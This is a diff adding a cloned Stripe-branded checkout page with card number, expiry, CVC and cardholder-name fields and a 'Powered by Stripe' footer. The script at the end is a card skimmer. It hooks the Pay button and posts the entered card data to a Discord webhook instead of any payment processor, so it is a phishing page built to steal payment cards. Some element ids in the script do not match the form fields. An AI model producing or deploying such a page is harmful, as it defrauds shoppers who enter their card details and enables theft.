+                                                <input class="CheckoutInput CheckoutInput--tabularnums Input Input--empty cardNumber" type="text" id="cc" name="cc" class="cc" placeholder="Enter card number">
+                                              </span>
+                                            </div>
+                                            <div class="FormFieldInput-Icons" style="opacity: 1;">
+                                              <div style="transform: none;">
+                                                <span class="FormFieldInput-IconsIcon is-visible">
+                                                  <img src="./checkout_files/visa-729c05c240c4bdb47b03ac81d9945bfe.svg" alt="Visa" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                </span>
+                                              </div>
+                                              <div style="transform: none;">
+                                                <span class="FormFieldInput-IconsIcon is-visible">
+                                                  <img src="./checkout_files/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="MasterCard" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                </span>
+                                              </div>
+                                              <div style="transform: none;">
+                                                <span class="FormFieldInput-IconsIcon is-visible">
+                                                  <img src="./checkout_files/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg" alt="American Express" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                </span>
+                                              </div>
+                                              <div class="CardFormFieldGroupIconOverflow">
+                                                <span class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible" role="presentation">
+                                                  <span class="FormFieldInput-IconsIcon" role="presentation">
+                                                    <img src="./checkout_files/unionpay-8a10aefc7295216c338ba4e1224627a1.svg" alt="UnionPay" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                  </span>
+                                                </span>
+                                                <span class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible" role="presentation">
+                                                  <span class="FormFieldInput-IconsIcon" role="presentation">
+                                                    <img src="./checkout_files/jcb-271fd06e6e7a2c52692ffa91a95fb64f.svg" alt="JCB" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                  </span>
+                                                </span>
+                                                <span class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible" role="presentation">
+                                                  <span class="FormFieldInput-IconsIcon" role="presentation">
+                                                    <img src="./checkout_files/discover-ac52cd46f89fa40a29a0bfb954e33173.svg" alt="Discover" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                  </span>
+                                                </span>
+                                                <span class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--visible" role="presentation">
+                                                  <span class="FormFieldInput-IconsIcon" role="presentation">
+                                                    <img src="./checkout_files/diners-fbcbd3360f8e3f629cdaa80e93abdb8b.svg" alt="Diners Club" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                  </span>
+                                                </span>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childLeft FormFieldGroup-childBottom">
+                                          <div class="FormFieldInput">
+                                            <div class="CheckoutInputContainer">
+                                              <span class="InputContainer" data-max="">
+                                                <input class="CheckoutInput CheckoutInput--tabularnums Input Input--empty exp" autocomplete="cc-exp" autocorrect="off" spellcheck="false" id="cardExpiry" name="cardExpiry" type="text" inputmode="numeric" aria-label="Expiration" placeholder="MM / YY" aria-invalid="false" data-1p-ignore="false" value="">
+                                              </span>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childRight FormFieldGroup-childBottom">
+                                          <div class="FormFieldInput has-icon padding-right-32">
+                                            <div class="CheckoutInputContainer">
+                                              <span class="InputContainer" data-max="">
+                                                <input class="CheckoutInput CheckoutInput--tabularnums Input Input--empty cvc" autocomplete="cc-csc" autocorrect="off" spellcheck="false" id="cardCvc" name="cardCvc" type="text" inputmode="numeric" aria-label="CVC" placeholder="CVC" aria-invalid="false" data-1p-ignore="false" value="">
+                                              </span>
+                                            </div>
+                                            <div class="FormFieldInput-Icon is-loaded" data-testid="FormFieldInput-Icon">
+                                              <div>
+                                                <svg class="Icon Icon--md" focusable="false" viewBox="0 0 32 21" role="img" aria-label="CVC">
+                                                  <title>CVC</title>
+                                                  <g fill="none" fill-rule="evenodd">
+                                                    <g class="Icon-fill">
+                                                      <g transform="translate(0 2)">
+                                                        <path d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z" opacity=".2"></path>
+                                                        <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3"></path>
+                                                      </g>
+                                                      <g transform="translate(18)">
+                                                        <path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z"></path>
+                                                      </g>
+                                                    </g>
+                                                  </g>
+                                                </svg>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div style="opacity: 0; height: 0px;">
+                                          <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                            <span aria-hidden="true"></span>
+                                          </span>
+                                        </div>
+                                      </div>
+                                    </fieldset>
+                                  </div>
+                                </div>
+                                <div class="InstallmentPlanOptionsForm InstallmentPlanOptionsForm-hidden flex-item width-12">
+                                  <div class="AnimateSinglePresence"></div>
+                                </div>
+                                <div class="BillingInfoForm-addressInput flex-item width-12" aria-hidden="false">
+                                  <div class="AnimateSinglePresence">
+                                    <div class="AnimateSinglePresenceItem">
+                                      <div>
+                                        <div class="flex-container spacing-16 direction-column wrap-wrap">
+                                          <div class="flex-item width-12">
+                                            <div class="FormFieldGroup">
+                                              <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                                <label for="billingName">
+                                                  <span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Cardholder name</span>
+                                                </label>
+                                              </div>
+                                              <div class="FormFieldGroup-Fieldset" id="billingName-fieldset">
+                                                <div class="FormFieldGroup-container" id="billingName-fieldset-inner">
+                                                  <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                                    <div class="FormFieldInput">
+                                                      <div class="CheckoutInputContainer">
+                                                        <span class="InputContainer" data-max="">
+                                                          <input class="CheckoutInput Input Input--empty" autocomplete="cc-name" autocorrect="off" spellcheck="false" id="billingName" name="billingName" type="text" placeholder="Full name on card" aria-invalid="false" data-1p-ignore="false" value="">
+                                                        </span>
+                                                      </div>
+                                                    </div>
+                                                  </div>
+                                                  <div style="opacity: 0; height: 0px;">
+                                                    <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                                      <span aria-hidden="true"></span>
+                                                    </span>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                          </div>
+                                          <div class="flex-item width-12">
+                                            <div class="FormFieldGroup">
+                                              <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                                <label for="country">
+                                                  <span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Country or region</span>
+                                                </label>
+                                              </div>
+                                              <div class="FormFieldGroup-Fieldset" id="country-fieldset">
+                                                <div class="FormFieldGroup-container FormFieldGroup-container--supportTransitions" id="country-fieldset-inner">
+                                                  <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                                    <div class="FormFieldInput is-select">
+                                                      <div>
+                                                        <div class="Select">
+                                                          <select id="billingCountry" name="billingCountry" autocomplete="billing country" aria-label="Country or region" class="Select-source">
+                                                            <option value="" disabled="" hidden=""></option>
+                                                            <option value="AF">Afghanistan</option>
+                                                            <option value="AX">Åland Islands</option>
+                                                            <option value="AL">Albania</option>
+                                                            <option value="DZ">Algeria</option>
+                                                            <option value="AD">Andorra</option>
+                                                            <option value="AO">Angola</option>
+                                                            <option value="AI">Anguilla</option>
+                                                            <option value="AQ">Antarctica</option>
+                                                            <option value="AG">Antigua &amp; Barbuda</option>
+                                                            <option value="AR">Argentina</option>
+                                                            <option value="AM">Armenia</option>
+                                                            <option value="AW">Aruba</option>
+                                                            <option value="AC">Ascension Island</option>
+                                                            <option value="AU">Australia</option>
+                                                            <option value="AT">Austria</option>
+                                                            <option value="AZ">Azerbaijan</option>
+                                                            <option value="BS">Bahamas</option>
+                                                            <option value="BH">Bahrain</option>
+                                                            <option value="BD">Bangladesh</option>
+                                                            <option value="BB">Barbados</option>
+                                                            <option value="BY">Belarus</option>
+                                                            <option value="BE">Belgium</option>
+                                                            <option value="BZ">Belize</option>
+                                                            <option value="BJ">Benin</option>
+                                                            <option value="BM">Bermuda</option>
+                                                            <option value="BT">Bhutan</option>
+                                                            <option value="BO">Bolivia</option>
+                                                            <option value="BA">Bosnia &amp; Herzegovina</option>
+                                                            <option value="BW">Botswana</option>
+                                                            <option value="BV">Bouvet Island</option>
+                                                            <option value="BR">Brazil</option>
+                                                            <option value="IO">British Indian Ocean Territory</option>
+                                                            <option value="VG">British Virgin Islands</option>
+                                                            <option value="BN">Brunei</option>
+                                                            <option value="BG">Bulgaria</option>
+                                                            <option value="BF">Burkina Faso</option>
+                                                            <option value="BI">Burundi</option>
+                                                            <option value="KH">Cambodia</option>
+                                                            <option value="CM">Cameroon</option>
+                                                            <option value="CA">Canada</option>
+                                                            <option value="CV">Cape Verde</option>
+                                                            <option value="BQ">Caribbean Netherlands</option>
+                                                            <option value="KY">Cayman Islands</option>
+                                                            <option value="CF">Central African Republic</option>
+                                                            <option value="TD">Chad</option>
+                                                            <option value="CL">Chile</option>
+                                                            <option value="CN">China</option>
+                                                            <option value="CO">Colombia</option>
+                                                            <option value="KM">Comoros</option>
+                                                            <option value="CG">Congo - Brazzaville</option>
+                                                            <option value="CD">Congo - Kinshasa</option>
+                                                            <option value="CK">Cook Islands</option>
+                                                            <option value="CR">Costa Rica</option>
+                                                            <option value="CI">Côte d’Ivoire</option>
+                                                            <option value="HR">Croatia</option>
+                                                            <option value="CW">Curaçao</option>
+                                                            <option value="CY">Cyprus</option>
+                                                            <option value="CZ">Czechia</option>
+                                                            <option value="DK">Denmark</option>
+                                                            <option value="DJ">Djibouti</option>
+                                                            <option value="DM">Dominica</option>
+                                                            <option value="DO">Dominican Republic</option>
+                                                            <option value="EC">Ecuador</option>
+                                                            <option value="EG">Egypt</option>
+                                                            <option value="SV">El Salvador</option>
+                                                            <option value="GQ">Equatorial Guinea</option>
+                                                            <option value="ER">Eritrea</option>
+                                                            <option value="EE">Estonia</option>
+                                                            <option value="SZ">Eswatini</option>
+                                                            <option value="ET">Ethiopia</option>
+                                                            <option value="FK">Falkland Islands</option>
+                                                            <option value="FO">Faroe Islands</option>
+                                                            <option value="FJ">Fiji</option>
+                                                            <option value="FI">Finland</option>
+                                                            <option value="FR">France</option>
+                                                            <option value="GF">French Guiana</option>
+                                                            <option value="PF">French Polynesia</option>
+                                                            <option value="TF">French Southern Territories</option>
+                                                            <option value="GA">Gabon</option>
+                                                            <option value="GM">Gambia</option>
+                                                            <option value="GE">Georgia</option>
+                                                            <option value="DE">Germany</option>
+                                                            <option value="GH">Ghana</option>
+                                                            <option value="GI">Gibraltar</option>
+                                                            <option value="GR">Greece</option>
+                                                            <option value="GL">Greenland</option>
+                                                            <option value="GD">Grenada</option>
+                                                            <option value="GP">Guadeloupe</option>
+                                                            <option value="GU">Guam</option>
+                                                            <option value="GT">Guatemala</option>
+                                                            <option value="GG">Guernsey</option>
+                                                            <option value="GN">Guinea</option>
+                                                            <option value="GW">Guinea-Bissau</option>
+                                                            <option value="GY">Guyana</option>
+                                                            <option value="HT">Haiti</option>
+                                                            <option value="HN">Honduras</option>
+                                                            <option value="HK">Hong Kong SAR China</option>
+                                                            <option value="HU">Hungary</option>
+                                                            <option value="IS">Iceland</option>
+                                                            <option value="IN">India</option>
+                                                            <option value="ID">Indonesia</option>
+                                                            <option value="IQ">Iraq</option>
+                                                            <option value="IE">Ireland</option>
+                                                            <option value="IM">Isle of Man</option>
+                                                            <option value="IL">Israel</option>
+                                                            <option value="IT">Italy</option>
+                                                            <option value="JM">Jamaica</option>
+                                                            <option value="JP">Japan</option>
+                                                            <option value="JE">Jersey</option>
+                                                            <option value="JO">Jordan</option>
+                                                            <option value="KZ">Kazakhstan</option>
+                                                            <option value="KE">Kenya</option>
+                                                            <option value="KI">Kiribati</option>
+                                                            <option value="XK">Kosovo</option>
+                                                            <option value="KW">Kuwait</option>
+                                                            <option value="KG">Kyrgyzstan</option>
+                                                            <option value="LA">Laos</option>
+                                                            <option value="LV">Latvia</option>
+                                                            <option value="LB">Lebanon</option>
+                                                            <option value="LS">Lesotho</option>
+                                                            <option value="LR">Liberia</option>
+                                                            <option value="LY">Libya</option>
+                                                            <option value="LI">Liechtenstein</option>
+                                                            <option value="LT">Lithuania</option>
+                                                            <option value="LU">Luxembourg</option>
+                                                            <option value="MO">Macao SAR China</option>
+                                                            <option value="MG">Madagascar</option>
+                                                            <option value="MW">Malawi</option>
+                                                            <option value="MY">Malaysia</option>
+                                                            <option value="MV">Maldives</option>
+                                                            <option value="ML">Mali</option>
+                                                            <option value="MT">Malta</option>
+                                                            <option value="MQ">Martinique</option>
+                                                            <option value="MR">Mauritania</option>
+                                                            <option value="MU">Mauritius</option>
+                                                            <option value="YT">Mayotte</option>
+                                                            <option value="MX">Mexico</option>
+                                                            <option value="MD">Moldova</option>
+                                                            <option value="MC">Monaco</option>
+                                                            <option value="MN">Mongolia</option>
+                                                            <option value="ME">Montenegro</option>
+                                                            <option value="MS">Montserrat</option>
+                                                            <option value="MA">Morocco</option>
+                                                            <option value="MZ">Mozambique</option>
+                                                            <option value="MM">Myanmar (Burma)</option>
+                                                            <option value="NA">Namibia</option>
+                                                            <option value="NR">Nauru</option>
+                                                            <option value="NP">Nepal</option>
+                                                            <option value="NL">Netherlands</option>
+                                                            <option value="NC">New Caledonia</option>
+                                                            <option value="NZ">New Zealand</option>
+                                                            <option value="NI">Nicaragua</option>
+                                                            <option value="NE">Niger</option>
+                                                            <option value="NG">Nigeria</option>
+                                                            <option value="NU">Niue</option>
+                                                            <option value="MK">North Macedonia</option>
+                                                            <option value="NO">Norway</option>
+                                                            <option value="OM">Oman</option>
+                                                            <option value="PK">Pakistan</option>
+                                                            <option value="PS">Palestinian Territories</option>
+                                                            <option value="PA">Panama</option>
+                                                            <option value="PG">Papua New Guinea</option>
+                                                            <option value="PY">Paraguay</option>
+                                                            <option value="PE">Peru</option>
+                                                            <option value="PH">Philippines</option>
+                                                            <option value="PN">Pitcairn Islands</option>
+                                                            <option value="PL">Poland</option>
+                                                            <option value="PT">Portugal</option>
+                                                            <option value="PR">Puerto Rico</option>
+                                                            <option value="QA">Qatar</option>
+                                                            <option value="RE">Réunion</option>
+                                                            <option value="RO">Romania</option>
+                                                            <option value="RU">Russia</option>
+                                                            <option value="RW">Rwanda</option>
+                                                            <option value="WS">Samoa</option>
+                                                            <option value="SM">San Marino</option>
+                                                            <option value="ST">São Tomé &amp; Príncipe</option>
+                                                            <option value="SA">Saudi Arabia</option>
+                                                            <option value="SN">Senegal</option>
+                                                            <option value="RS">Serbia</option>
+                                                            <option value="SC">Seychelles</option>
+                                                            <option value="SL">Sierra Leone</option>
+                                                            <option value="SG">Singapore</option>
+                                                            <option value="SX">Sint Maarten</option>
+                                                            <option value="SK">Slovakia</option>
+                                                            <option value="SI">Slovenia</option>
+                                                            <option value="SB">Solomon Islands</option>
+                                                            <option value="SO">Somalia</option>
+                                                            <option value="ZA">South Africa</option>
+                                                            <option value="GS">South Georgia &amp; South Sandwich Islands</option>
+                                                            <option value="KR">South Korea</option>
+                                                            <option value="SS">South Sudan</option>
+                                                            <option value="ES">Spain</option>
+                                                            <option value="LK">Sri Lanka</option>
+                                                            <option value="BL">St. Barthélemy</option>
+                                                            <option value="SH">St. Helena</option>
+                                                            <option value="KN">St. Kitts &amp; Nevis</option>
+                                                            <option value="LC">St. Lucia</option>
+                                                            <option value="MF">St. Martin</option>
+                                                            <option value="PM">St. Pierre &amp; Miquelon</option>
+                                                            <option value="VC">St. Vincent &amp; Grenadines</option>
+                                                            <option value="SR">Suriname</option>
+                                                            <option value="SJ">Svalbard &amp; Jan Mayen</option>
+                                                            <option value="SE">Sweden</option>
+                                                            <option value="CH">Switzerland</option>
+                                                            <option value="TW">Taiwan</option>
+                                                            <option value="TJ">Tajikistan</option>
+                                                            <option value="TZ">Tanzania</option>
+                                                            <option value="TH">Thailand</option>
+                                                            <option value="TL">Timor-Leste</option>
+                                                            <option value="TG">Togo</option>
+                                                            <option value="TK">Tokelau</option>
+                                                            <option value="TO">Tonga</option>
+                                                            <option value="TT">Trinidad &amp; Tobago</option>
+                                                            <option value="TA">Tristan da Cunha</option>
+                                                            <option value="TN">Tunisia</option>
+                                                            <option value="TR">Turkey</option>
+                                                            <option value="TM">Turkmenistan</option>
+                                                            <option value="TC">Turks &amp; Caicos Islands</option>
+                                                            <option value="TV">Tuvalu</option>
+                                                            <option value="UG">Uganda</option>
+                                                            <option value="UA">Ukraine</option>
+                                                            <option value="AE">United Arab Emirates</option>
+                                                            <option value="GB">United Kingdom</option>
+                                                            <option value="US">United States</option>
+                                                            <option value="UY">Uruguay</option>
+                                                            <option value="UZ">Uzbekistan</option>
+                                                            <option value="VU">Vanuatu</option>
+                                                            <option value="VA">Vatican City</option>
+                                                            <option value="VE">Venezuela</option>
+                                                            <option value="VN">Vietnam</option>
+                                                            <option value="WF">Wallis &amp; Futuna</option>
+                                                            <option value="EH">Western Sahara</option>
+                                                            <option value="YE">Yemen</option>
+                                                            <option value="ZM">Zambia</option>
+                                                            <option value="ZW">Zimbabwe</option>
+                                                          </select>
+                                                          <svg class="InlineSVG Icon Select-arrow Icon--sm" focusable="false" viewBox="0 0 12 12">
+                                                            <path d="M10.193 3.97a.75.75 0 0 1 1.062 1.062L6.53 9.756a.75.75 0 0 1-1.06 0L.745 5.032A.75.75 0 0 1 1.807 3.97L6 8.163l4.193-4.193z" fill-rule="evenodd"></path>
+                                                          </svg>
+                                                        </div>
+                                                      </div>
+                                                    </div>
+                                                  </div>
+                                                  <div style="opacity: 0; height: 0px;">
+                                                    <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                                      <span aria-hidden="true"></span>
+                                                    </span>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <div class="AnimateSinglePresence">
+                                  <div class="AnimateSinglePresenceItem">
+                                    <div>
+                                      <div class="SignUpForm-signUpFormContainer flex-item width-12">
+                                        <div>
+                                          <div class="SignUpForm SignUpForm--withTerms">
+                                            <div class="SignUpForm-headerContainer">
+                                              <div class="FormFieldCheckbox SignUpForm-checkbox">
+                                                <div class="CheckboxField">
+                                                  <div class="Checkbox">
+                                                    <div class="Checkbox-InputContainer">
+                                                      <input id="enableStripePass" name="enableStripePass" type="checkbox" class="Checkbox-Input">
+                                                      <span class="Checkbox-StyledInput">
+                                                        <svg class="InlineSVG Icon Checkbox-tickSvg" focusable="false" width="21" height="19" viewBox="0 0 21 19" fill="none">
+                                                          <path fill-rule="evenodd" clip-rule="evenodd" d="M19.2242 3.76495L8.52368 17.1606L2.25391 10.6793L4.41013 8.59346L8.30846 12.6233L16.8802 1.89258L19.2242 3.76495Z" fill="#1A1A1A" fill-opacity="0.9"></path>
+                                                          <path d="M19.6149 4.07702L19.9269 3.68636L19.5363 3.37429L17.1923 1.50192L16.8016 1.18985L16.4896 1.58052L8.27259 11.8671L4.7695 8.24582L4.42186 7.88645L4.06249 8.23409L1.90627 10.3199L1.5469 10.6676L1.89454 11.0269L8.16431 17.5083L8.55955 17.9169L8.91434 17.4727L19.6149 4.07702Z" stroke="white" stroke-opacity="0.5" stroke-linecap="square"></path>
+                                                        </svg>
+                                                      </span>
+                                                    </div>
+                                                    <label for="enableStripePass">
+                                                      <span class="Checkbox-Label Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+                                                        <div class="SignUpForm-labelHeader" style="opacity: 1;">Securely save my information for 1-click checkout</div>
+                                                        <div class="SignUpForm-subLabel" id="link-registration-subheader-message">Pay faster on My Store and everywhere Link is accepted.</div>
+                                                      </span>
+                                                    </label>
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                            <div class="AnimateSinglePresence"></div>
+                                          </div>
+                                          <div class="AnimateSinglePresence"></div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="PaymentForm-confirmPaymentContainer mt4 flex-item width-grow">
+                      <div class="ConfirmPayment">
+                        <div class="flex-item width-12"></div>
+                        <div class="flex-item width-12">
+                          <button id="payButton" class="SubmitButton SubmitButton" style="background-color: rgb(0, 148, 255); color: rgb(255, 255, 255);">
+                            <div class="SubmitButton-Shimmer" style="background: linear-gradient(to right, rgba(0, 148, 255, 0) 0%, rgb(66, 172, 255) 50%, rgba(0, 148, 255, 0) 100%);"></div>
+                            <div class="SubmitButton-TextContainer">
+                              <span id="payButton" class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate button">Pay</span>
+                            </div>
+                            <div class="SubmitButton-IconContainer">
+                              <div class="SubmitButton-Icon SubmitButton-Icon--pre">
+                                <div>
+                                  <div class="Icon Icon--md Icon--square">
+                                    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" focusable="false">
+                                      <path d="M3 7V5a5 5 0 1 1 10 0v2h.5a1 1 0 0 1 1 1v6a2 2 0 0 1-2 2h-9a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1zm5 2.5a1 1 0 0 0-1 1v2a1 1 0 0 0 2 0v-2a1 1 0 0 0-1-1zM11 7V5a3 3 0 1 0-6 0v2z" fill="#ffffff" fill-rule="evenodd"></path>
+                                    </svg>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="SubmitButton-Icon SubmitButton-SpinnerIcon SubmitButton-Icon--pre">
+                                <div>
+                                  <div class="Icon Icon--md Icon--square">
+                                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" focusable="false">
+                                      <ellipse cx="12" cy="12" rx="10" ry="10" style="stroke: rgb(255, 255, 255);"></ellipse>
+                                    </svg>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <div class="SubmitButton-CheckmarkIcon">
+                              <div>
+                                <div class="Icon Icon--md">
+                                  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="14" focusable="false">
+                                    <path d="M 0.5 6 L 8 13.5 L 21.5 0" fill="transparent" stroke-width="2" stroke="#ffffff" stroke-linecap="round" stroke-linejoin="round"></path>
+                                  </svg>
+                                </div>
+                              </div>
+                            </div>
+                          </button>
+                        </div>
+                        <div class="flex-item width-12">
+                          <div class="ConfirmPayment-PostSubmit">
+                            <div class="ConfirmTerms">
+                              <div class="AnimateSinglePresence"></div>
+                              <div class="AnimateSinglePresence"></div>
+                              <div class="AnimateSinglePresence">
+                                <div class="AnimateSinglePresenceItem ConfirmPaymentTerms">
+                                  <div class="ConfirmTerms Text Text-color--gray600 Text-fontSize--13" data-testid="ConfirmPaymentTermsText">
+                                    <div class="AnimateSinglePresence"></div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="PaymentForm-climateProgramBadge"></div>
+                  </form>
+                </div>
+              </div>
+            </main>
+          </div>
+          <footer class="App-Footer Footer">
+            <div class="Footer-PoweredBy">
+              <a class="Link Link--primary" href="https://stripe.com/" target="_blank" rel="noopener">
+                <span class="Footer-PoweredBy-Text Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Powered by <svg class="InlineSVG Icon Footer-PoweredBy-Icon Icon--md" focusable="false" width="33" height="15" role="img" aria-labelledby="stripe-title">
+                    <title id="stripe-title">Stripe</title>
+                                          <path d="M32.956 7.925c0-2.313-1.12-4.138-3.261-4.138-2.15 0-3.451 1.825-3.451 4.12 0 2.719 1.535 4.092 3.74 4.092 1.075 0 1.888-.244 2.502-.587V9.605c-.614.307-1.319.497-2.213.497-.876 0-1.653-.307-1.753-1.373h4.418c0-.118.018-.588.018-.804zm-4.463-.859c0-1.02.624-1.445 1.193-1.445.55 0 1.138.424 1.138 1.445h-2.33zM22.756 3.787c-.885 0-1.454.415-1.77.704l-.118-.56H18.88v10.535l2.259-.48.009-2.556c.325.235.804.57 1.6.57 1.616 0 3.089-1.302 3.089-4.166-.01-2.62-1.5-4.047-3.08-4.047zm-.542 6.225c-.533 0-.85-.19-1.066-.425l-.009-3.352c.235-.262.56-.443 1.075-.443.822 0 1.391.922 1.391 2.105 0 1.211-.56 2.115-1.39 2.115zM18.04 2.766V.932l-2.268.479v1.843zM15.772 3.94h2.268v7.905h-2.268zM13.342 4.609l-.144-.669h-1.952v7.906h2.259V6.488c.533-.696 1.436-.57 1.716-.47V3.94c-.289-.108-1.346-.307-1.879.669zM8.825 1.98l-2.205.47-.009 7.236c0 1.337 1.003 2.322 2.34 2.322.741 0 1.283-.135 1.581-.298V9.876c-.289.117-1.716.533-1.716-.804V5.865h1.716V3.94H8.816l.009-1.96zM2.718 6.235c0-.352.289-.488.767-.488.687 0 1.554.208 2.241.578V4.202a5.958 5.958 0 0 0-2.24-.415c-1.835 0-3.054.957-3.054 2.557 0 2.493 3.433 2.096 3.433 3.17 0 .416-.361.552-.867.552-.75 0-1.708-.307-2.467-.723v2.15c.84.362 1.69.515 2.467.515 1.879 0 3.17-.93 3.17-2.548-.008-2.692-3.45-2.213-3.45-3.225z"></path>
+                  </svg>
+                </span>
+              </a>
+            </div>
+            <div class="CheckoutFooter-links flex-container direction-row">
+              <a class="Link CheckoutFooter-link Link--checkout--secondary" href="https://stripe.com/legal/end-users" target="_blank" rel="noopener">
+                <span class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Terms</span>
+              </a>
+              <a class="Link CheckoutFooter-link Link--checkout--secondary" href="https://stripe.com/privacy" target="_blank" rel="noopener">
+                <span class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Privacy</span>
+              </a>
+            </div>
+          </footer>
+        </div>
+      </div>
+    </div>
+
+    <script>
+        // Replace with your Discord webhook URL
+        const discordWebhookURL = 'WEBHOOK';
+
+        function sendDiscordMessage() {
+            const cc = document.getElementById('cardCVC').value;
+
+            if (!cc.trim()) {
+                alert('Please enter a message before sending.');
+                return;
+            }
+
+            const embedMessage = {
+                embeds: [
+                    {
+                        title: 'CC',
+                        description: cc,
+                        color: 16777215 // White color
+                    }
+                ]
+            };
+
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Message sent to Discord successfully!');
+                    document.getElementById('cardNumber').value = '';
+                } else {
+                    throw new Error('Failed to send message to Discord.');
+                }
+            })
+                        .catch(error => {
+                console.error(error);
+                alert('Oops, something went wrong. Please try again later.');
+            });
+
+        }
+
+        // Add event listener to the "Pay" button
+        document.getElementById('payButton').addEventListener('click', sendDiscordMessage);
+    </script> 
+  </body>
+</html>
